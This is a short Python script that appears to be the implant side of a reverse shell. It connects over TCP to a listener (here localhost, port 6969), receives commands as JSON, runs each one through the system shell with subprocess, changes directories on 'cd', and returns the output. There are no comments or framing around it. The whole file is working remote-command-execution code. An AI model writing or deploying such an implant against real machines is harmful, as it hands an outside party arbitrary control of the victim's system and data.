import socket
import json
import subprocess
import os
import logging

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

HOST = "localhost"
PORT = 6969

s.connect((HOST, PORT))

def send(data):
    msg = json.dumps(data)
    s.send(msg.encode())

def recv() -> str:
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data) 
        except ValueError:
            continue

def shell():
    while True:
        command = recv()
        if command.startswith("cd"):
            os.chdir(command.split()[1])
            output = f"changed to {os.getcwd()}"
        else:
            output = subprocess.getoutput(command)

        send(output)

shell()
    




